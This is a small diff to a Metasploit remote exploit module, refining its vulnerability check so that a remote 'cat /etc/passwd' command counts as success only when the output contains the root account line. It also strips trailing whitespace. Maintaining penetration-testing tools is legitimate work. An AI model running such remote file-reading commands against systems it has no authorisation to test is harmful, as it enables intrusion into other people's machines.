@@ -82,7 +82,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def check
     res = execute_command('cat /etc/passwd')
-    if res && res.code == 200
+    if res && res.body.include?("root:x:0:0:root:/root:/bin/bash")
       CheckCode::Vulnerable
     end
   end
@@ -95,4 +95,3 @@ class MetasploitModule < Msf::Exploit::Remote
       end
   end
 end
-  
